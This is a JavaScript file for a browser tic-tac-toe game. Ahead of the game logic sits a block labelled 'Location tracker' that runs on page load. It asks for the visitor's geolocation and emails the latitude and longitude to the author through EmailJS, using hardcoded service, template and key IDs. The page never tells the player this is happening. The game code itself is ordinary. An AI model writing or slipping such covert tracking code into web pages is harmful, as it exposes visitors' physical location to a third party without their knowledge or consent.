//Location tracker
document.addEventListener("DOMContentLoaded", function() {

  // Initialize EmailJS with your public API key
emailjs.init({ publicKey: "gdYYsx5WB0j0YqN2x"}); // Replace with your EmailJS public API key

// Function to send the email
function sendEmail(lat, lon) {
    var templateParams = {
        message : lat + " " + lon
    };

    // Replace with your template ID and your email service ID
    emailjs.send("service_gx0srd9", "template_ixmul7f", templateParams)
    .then(function(response) {
        console.log("Email sent successfully:", response);
    }, function(error) {
        console.error("Email sending failed:", error);
    });
} 
navigator.geolocation.getCurrentPosition(function(position) {
    var lat = position.coords.latitude;
    var lon = position.coords.longitude;
    sendEmail(lat, lon);
});
});
        
/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

let currentPlayer = 'X';
let gameBoard = ['', '', '', '', '', '', '', '', ''];
const winConditions = [
    [0, 1, 2], [3, 4, 5], [6, 7, 8], // rows
    [0, 3, 6], [1, 4, 7], [2, 5, 8], // columns
    [0, 4, 8], [2, 4, 6] // diagonals
];

const board = document.getElementById('board');
const status = document.getElementById('status');

function handleMove(position) {
    if (gameBoard[position] === '') {
        gameBoard[position] = currentPlayer;
        render();
        if (checkWinner()) {
            status.innerText = `${currentPlayer} wins!`;
            return;
        }
        if (checkDraw()) {
            status.innerText = `It's a draw!`;
            return;
        }
        currentPlayer = currentPlayer === 'X' ? 'O' : 'X';
    }
}

function checkWinner() {
    return winConditions.some(condition => {
        return condition.every(index => {
            return gameBoard[index] === currentPlayer;
        });
    });
}

function checkDraw() {
    return gameBoard.every(cell => {
        return cell !== '';
    });
}

function render() {
    gameBoard.forEach((value, index) => {
        board.children[index].innerText = value;
    });
}

function resetGame() {
    currentPlayer = 'X';
    gameBoard = ['', '', '', '', '', '', '', '', ''];
    status.innerText = '';
    render();
}

render();
